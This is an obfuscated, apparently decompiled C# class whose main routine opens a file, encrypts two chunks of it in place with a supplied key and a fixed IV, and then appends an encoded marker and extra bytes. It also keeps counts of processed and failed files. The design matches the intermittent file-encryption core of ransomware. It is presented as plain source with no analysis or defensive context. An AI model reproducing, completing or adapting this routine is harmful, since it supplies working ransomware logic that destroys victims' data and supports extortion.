using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using vwkoAFlFxYAven;

namespace JNgWsfAJdq;

internal sealed class OtwBgoVUjwmos
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int DulgjOHSfZh(long long_0)
	{
		return (int)long_0;
	}

	public static void PDnoxZCfZtLYh(string XlLQaCLMWuR, string UlXDadSgFx, string NdZtpARKatdAR, byte[] floDqgFVoQhmH = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(XlLQaCLMWuR, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = DulgjOHSfZh(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(UlXDadSgFx) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(UlXDadSgFx) * 1000 * 1000;
				}
				int mrRPqeKNNzNK = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = WfflqdBXPIuyo(XlLQaCLMWuR, fileStream, mrRPqeKNNzNK, num * i);
					array = (vjvaexovZfdCP.tbUmPYlAGHV ? idTumjwtCKpZx.hLiqKlBgJzHKEXvg(byte_, Encoding.ASCII.GetBytes(NdZtpARKatdAR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : bQwLemggMIXO.FIiJNguIBznfy(byte_, Encoding.ASCII.GetBytes(NdZtpARKatdAR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					gXckaFAKjAAsVSrXlnh(XlLQaCLMWuR, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (vjvaexovZfdCP.XuGnEkReQEL ? Encoding.ASCII.GetBytes(vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107459958)) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460942)) + Convert.ToString(UlXDadSgFx) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460942))) : Encoding.ASCII.GetBytes(vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107459958)) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460951)) + Convert.ToString(UlXDadSgFx) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460951))));
			if (!vjvaexovZfdCP.XuGnEkReQEL)
			{
				using FileStream fileStream2 = new FileStream(XlLQaCLMWuR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(XlLQaCLMWuR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(floDqgFVoQhmH, 0, floDqgFVoQhmH.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (vjvaexovZfdCP.mLogOAlXxCGZma)
			{
				try
				{
					File.AppendAllText(vjvaexovZfdCP.PuxbPamNEvKf, getString_0(107349936) + XlLQaCLMWuR + getString_0(107459945) + ex.Message + getString_0(107396671));
				}
				catch (Exception)
				{
				}
			}
			vjvaexovZfdCP.slRUPIhEEasxMv++;
		}
		vjvaexovZfdCP.oNVtehkGXSvfD++;
	}

	public static byte[] WfflqdBXPIuyo(string yMkxHCLGfdfSsmr, FileStream jqpsMRlQhYvTI, int MrRPqeKNNzNK, int nWWYFpKvoVSGPs = 0)
	{
		byte[] array = new byte[MrRPqeKNNzNK];
		jqpsMRlQhYvTI.Position = nWWYFpKvoVSGPs;
		jqpsMRlQhYvTI.Read(array, 0, MrRPqeKNNzNK);
		return array;
	}

	public static void gXckaFAKjAAsVSrXlnh(string CQwHOIQhnMHG, FileStream RyYQALLSYYll, byte[] qhUjnhgrtSwL, int apyQBVofFDvqg = 0)
	{
		RyYQALLSYYll.Position = apyQBVofFDvqg;
		RyYQALLSYYll.Write(qhUjnhgrtSwL, 0, qhUjnhgrtSwL.Length);
	}

	static OtwBgoVUjwmos()
	{
		Strings.CreateGetStringDelegate(typeof(OtwBgoVUjwmos));
	}
}
